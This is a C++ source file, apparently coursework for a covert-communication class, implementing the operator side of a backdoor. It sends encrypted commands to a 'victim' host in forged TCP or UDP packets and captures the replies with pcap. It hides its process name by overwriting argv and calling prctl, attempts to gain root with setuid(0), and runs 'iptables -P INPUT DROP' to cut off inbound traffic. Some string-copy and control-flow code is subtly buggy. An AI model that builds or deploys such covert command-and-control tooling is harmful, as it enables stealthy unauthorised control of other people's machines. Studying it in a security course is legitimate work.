/*******************************************************************************
**
**  Author:   Mario Enriquez,   A00909441
**  Class:    COMP_8505
**  Title:    Final Assignment, Covert Communication
**
**  Notes:
**        -Install cryptopp
**
*******************************************************************************/

#include "headers.h"

void forgepacket(char[],char[],int,char*, int);
void forgedatagram(char[],char[],int,char*, int);
static volatile sig_atomic_t doneflag = 0;
std::string encr_decr(std::string);

char src_host[80],dst_host[80],protocol[3];
int port[6],ip_id,password;

// Check all the headers in the Ethernet frame
void pkt_callback(u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet){
  u_int16_t type = handle_ethernet(args,pkthdr,packet);
  if(type == ETHERTYPE_IP){
  	handle_IP(args,pkthdr,packet,port,ip_id);
  }
}

void ask_input(int id){
  string command="";
  string encrypt;
  do{
    cout << "Please input your command: " << endl;
    getline(cin,command);
    if(command.length()>0)
      encrypt=encr_decr(command);
      cout << protocol << endl;
      if(strcmp(protocol,"tcp")==0){
        cout << "sending packet" << endl;
        forgepacket(src_host,dst_host,port[0],(char *)encrypt.c_str(),ip_id);
      } else {
        cout << "sending datagram" << endl;
        forgedatagram(src_host,dst_host,port[0],(char *)encrypt.c_str(),ip_id);
      }

  } while(command.length()>0);
}

string exec(char* cmd) {
  char buffer[128];
  string result = "";
  std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
  if (!pipe) throw std::runtime_error("popen() failed!");
  while (!feof(pipe.get())) {
    if (fgets(buffer, 128, pipe.get()) != NULL)
      result += buffer;
  }
  return result;
}

void build_pcap_filter() {
  pcap_t* nic_descr;
  char *nic_dev;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;      // holds compiled program
  bpf_u_int32 maskp;          // subnet mask
  bpf_u_int32 netp;           // ip
  u_char* args = NULL;
  string filter;

  nic_dev = pcap_lookupdev(errbuf);
    if (nic_dev == NULL)
    {
    printf("%s\n",errbuf);
    exit(1);
  }

  // Use pcap to get the IP address and subnet mask of the device
  pcap_lookupnet (nic_dev, &netp, &maskp, errbuf);

    // open the device for packet capture & set the device in promiscuous mode
  nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
  if (nic_descr == NULL){
    printf("pcap_open_live(): %s\n",errbuf);
    exit(1);
  }

  filter = string("")+protocol+" and src host " + dst_host;
  // Compile the filter expression
  if (pcap_compile (nic_descr, &fp, (char *) filter.c_str(), 0, netp) == -1){
    fprintf(stderr,"Error calling pcap_compile\n");
    exit(1);
  }

    // Load the filter into the capture device
  if (pcap_setfilter (nic_descr, &fp) == -1){
    fprintf(stderr,"Error setting filter\n");
    exit(1);
  }

  // Start the capture session
  pcap_loop (nic_descr, 0, pkt_callback, args);
  fprintf(stdout,"\nCapture Session Done\n");
}

int main (int argc, char **argv){
  int i;
  string a,b;
  char mask[16];
  std::string::size_type sz;
  string iptable_drop="iptables -P INPUT DROP";

  srand(time(0));
  if(argc != 3){
    cout << "\nUsage:\n\t./main maskname configuration_file"<< endl;
    exit(-1);
  }
  std::ifstream infile(argv[2]);
  strcpy(mask,argv[1]);

  while (infile >> a >> b){
    if(a=="protocol"){
      strncpy(protocol,b.c_str(),sizeof(b));
    }
    if(a=="src_host"){
      strncpy(src_host,b.c_str(),sizeof(b));
    }
    if(a=="dst_host"){
      strncpy(dst_host,b.c_str(),sizeof(b));
    }
    if(a=="ip_id"){
      ip_id = std::stoi (b,&sz);
    }
    if(a=="password"){
      password = std::stoi (b,&sz);
    }
    if(a=="dst_port"){ //Target port for victim command
      port[0] = std::stoi (b,&sz);
    }
    if(a=="src_port"){ // target port to receive victim's command
      port[1] = std::stoi (b,&sz);
    }
    if(a=="knock_1"){ //Target port for victim command
      port[2] = std::stoi (b,&sz);
    }
    if(a=="knock_2"){ // target port to receive victim's command
      port[3] = std::stoi (b,&sz);
    }
    if(a=="knock_3"){ //Target port for victim command
      port[4] = std::stoi (b,&sz);
    }
    if(a=="tcp_port"){ // target port to receive victim's command
      port[5] = std::stoi (b,&sz);
    }
  }

  for( i = 0 ; i < argc ; i++){
    memset(argv[i], 0, strlen(argv[i]));
  }
  strcpy(argv[0], mask);
  prctl(PR_SET_NAME, mask, 0, 0);

  /* change the UID/GID to 0 (raise privs) */
  setuid(0);
  setgid(0);

  exec((char *)iptable_drop.c_str());

  std::thread t1(ask_input,1080);
  std::thread t2(build_pcap_filter);
  std::thread t3(recv_packet);
  t1.join();
  t2.join();
  t3.join();

  return 1;
}
